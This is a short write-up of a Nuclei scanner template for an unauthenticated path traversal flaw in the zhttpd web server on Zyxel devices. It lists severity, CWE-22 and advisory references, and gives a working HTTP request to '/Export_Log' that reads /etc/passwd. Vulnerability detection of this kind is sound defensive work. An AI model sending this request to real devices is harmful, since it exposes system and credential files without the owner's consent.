# Nuclei Template: zhttpd - Local File Inclusion
**Template ID:** unauth-lfd-zhttpd
**Vulnerability Class:** Path Traversal
**Severity:** High
**CWE:** CWE-22
**Source:** Nuclei Template (`unauth-lfd-zhttpd.yaml`)

## Vulnerability Information & PoC

## Description
zhttpd is vulnerable to unauthenticated local inclusion including privileged files such as /etc/shadow. An attacker can read all files on the system by using this endpoint.

## Steps to reproduce / Exploit Payload
```http
GET /Export_Log?/etc/passwd HTTP/1.1
Host: {{Hostname}}
Accept: */*
```

## References
- https://sec-consult.com/blog/detail/enemy-within-unauthenticated-buffer-overflows-zyxel-routers/
- https://sec-consult.com/vulnerability-lab/advisory/multiple-critical-vulnerabilities-in-multiple-zyxel-devices/
- https://github.com/rapid7/metasploit-framework/pull/17388
